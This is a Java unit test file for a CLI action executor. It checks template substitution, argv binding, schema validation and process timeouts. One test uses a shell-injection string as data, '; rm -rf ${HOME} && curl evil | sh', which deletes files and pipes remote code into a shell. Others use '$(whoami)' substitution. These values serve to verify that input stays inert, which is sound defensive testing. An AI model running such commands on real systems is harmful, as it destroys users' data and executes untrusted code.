package io.hensu.cli.action;

import static org.assertj.core.api.Assertions.assertThat;

import io.hensu.cli.sandbox.CommandRunner;
import io.hensu.cli.sandbox.UnavailableSandboxLauncher;
import io.hensu.cli.tool.CommandCatalog;
import io.hensu.core.execution.action.Action;
import io.hensu.core.execution.action.ActionExecutor.ActionResult;
import io.hensu.core.execution.action.ActionHandler;
import io.hensu.core.execution.action.CommandDefinition;
import io.hensu.core.execution.action.CommandRegistry;
import io.hensu.core.execution.action.ParamSpec;
import io.hensu.core.execution.action.SandboxPolicy;
import io.hensu.core.execution.action.ToolSpec;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

class CLIActionExecutorTest {

    private CLIActionExecutor executor;

    @BeforeEach
    void setUp() {
        executor = new CLIActionExecutor(new CommandCatalog());
        // These tests cover the action path's own behaviour – catalog lookup, argv
        // binding, timeouts – so containment is switched off rather than depending
        // on whether this host has a working sandbox backend. Containment itself is
        // covered by SandboxContainmentTest and SeatbeltProfileTest.
        executor.setCommandRunner(
                new CommandRunner(
                        new UnavailableSandboxLauncher("test"),
                        Map.of("PATH", System.getenv("PATH")),
                        true));
    }

    // ========== Send Action Tests ==========

    @Test
    void shouldResolveTemplateVariablesInPayload() {
        var handler = new PayloadCapturingHandler("template-handler");
        executor.registerHandler(handler);

        Action.Send send =
                new Action.Send("template-handler", Map.of("message", "Hello {name}"), false);
        Map<String, Object> context = Map.of("name", "World");

        executor.execute(send, context);

        assertThat(handler.capturedPayload).containsEntry("message", "Hello World");
    }

    @Test
    void shouldNotResolveTemplatesWhenRawPayloadTrue() {
        var handler = new PayloadCapturingHandler("raw-handler");
        executor.registerHandler(handler);

        Action.Send send = new Action.Send("raw-handler", Map.of("message", "{name}"), true);
        Map<String, Object> context = Map.of("name", "World");

        executor.execute(send, context);

        assertThat(handler.capturedPayload).containsEntry("message", "{name}");
    }

    // ========== Execute Action – Argv Binding Tests ==========

    @Test
    void shouldBindShellMetacharactersAsOneInertArgvElement() {
        CommandRegistry registry = new CommandRegistry();
        registry.registerCommand("greet", echoing("name"));
        executor.setCommandRegistry(registry);

        String injection = "; rm -rf ${HOME} && curl evil | sh";
        ActionResult result =
                executor.execute(new Action.Execute("greet"), Map.of("name", injection));

        assertThat(result.success()).isTrue();
        // Handed to execve as data: no chaining ran, nothing expanded, nothing split.
        assertThat(result.output().toString()).isEqualTo(injection);
    }

    @Test
    void shouldNotExpandCommandSubstitutionInABoundArgument() {
        CommandRegistry registry = new CommandRegistry();
        registry.registerCommand("show", echoing("val"));
        executor.setCommandRegistry(registry);

        ActionResult result =
                executor.execute(new Action.Execute("show"), Map.of("val", "$(whoami)"));

        assertThat(result.success()).isTrue();
        assertThat(result.output().toString()).isEqualTo("$(whoami)");
    }

    @Test
    void shouldRejectArgumentsThatFailTheDeclaredSchemaBeforeSpawning() {
        CommandRegistry registry = new CommandRegistry();
        registry.registerCommand(
                "tagged",
                new CommandDefinition(
                        List.of("/bin/echo", "{tag}"),
                        null,
                        30_000L,
                        Map.of(),
                        new ToolSpec(
                                "Echo a tag",
                                List.of(
                                        new ParamSpec(
                                                "tag",
                                                "string",
                                                true,
                                                "^[a-z]+$",
                                                List.of(),
                                                null,
                                                false))),
                        SandboxPolicy.restrictive(),
                        false,
                        false));
        executor.setCommandRegistry(registry);

        ActionResult result =
                executor.execute(new Action.Execute("tagged"), Map.of("tag", "NOT lowercase"));

        assertThat(result.success()).isFalse();
        assertThat(result.message()).contains("does not match pattern");
    }

    @Test
    void shouldPassShellModeParametersThroughTheReservedEnvironmentNamespace() {
        CommandRegistry registry = new CommandRegistry();
        registry.registerCommand(
                "greet",
                new CommandDefinition(
                        null,
                        "printf '%s' \"$HENSU_PARAM_NAME\"",
                        30_000L,
                        Map.of(),
                        new ToolSpec("Greet", List.of(ParamSpec.optionalString("name"))),
                        SandboxPolicy.restrictive(),
                        false,
                        false));
        executor.setCommandRegistry(registry);

        ActionResult result =
                executor.execute(new Action.Execute("greet"), Map.of("name", "$(whoami)"));

        assertThat(result.success()).isTrue();
        // The shell reads the value with getenv and never re-parses it.
        assertThat(result.output().toString()).isEqualTo("$(whoami)");
    }

    // ========== Execute Action – Timeout Tests ==========

    @Test
    void shouldTimeoutHangingProcess() {
        CommandRegistry registry = new CommandRegistry();
        registry.registerCommand(
                "hang",
                new CommandDefinition(
                        List.of("/bin/sleep", "10"),
                        null,
                        100L,
                        Map.of(),
                        null,
                        SandboxPolicy.restrictive(),
                        false,
                        false));
        executor.setCommandRegistry(registry);

        ActionResult result = executor.execute(new Action.Execute("hang"), Map.of());

        assertThat(result.success()).isFalse();
        assertThat(result.message()).contains("timed out");
    }

    @Test
    void shouldTimeoutProcessThatFloodsPipeBuffer() {
        CommandRegistry registry = new CommandRegistry();
        // Generates output exceeding typical 64KB pipe buffer, with a 200ms timeout
        registry.registerCommand(
                "flood",
                new CommandDefinition(
                        null,
                        "yes 'aaaaaaaaaa' | head -100000; sleep 10",
                        200L,
                        Map.of(),
                        null,
                        SandboxPolicy.restrictive(),
                        false,
                        false));
        executor.setCommandRegistry(registry);

        ActionResult result = executor.execute(new Action.Execute("flood"), Map.of());

        assertThat(result.success()).isFalse();
        assertThat(result.message()).contains("timed out");
    }

    // ========== Execute Action – Functional Tests ==========

    @Test
    void shouldFailWhenCommandNotInRegistry() {
        ActionResult result = executor.execute(new Action.Execute("unknown-command"), Map.of());

        assertThat(result.success()).isFalse();
        assertThat(result.message()).contains("Command not found");
    }

    // ========== Test Helpers ==========

    private static CommandDefinition echoing(String param) {
        return new CommandDefinition(
                List.of("/bin/echo", "{" + param + "}"),
                null,
                30_000L,
                Map.of(),
                new ToolSpec("Echo a value", List.of(ParamSpec.optionalString(param))),
                SandboxPolicy.restrictive(),
                false,
                false);
    }

    static class PayloadCapturingHandler implements ActionHandler {
        private final String handlerId;
        Map<String, Object> capturedPayload;

        PayloadCapturingHandler(String handlerId) {
            this.handlerId = handlerId;
        }

        @Override
        public String getHandlerId() {
            return handlerId;
        }

        @Override
        public ActionResult execute(Map<String, Object> payload, Map<String, Object> context) {
            this.capturedPayload = payload;
            return ActionResult.success("Captured");
        }
    }
}
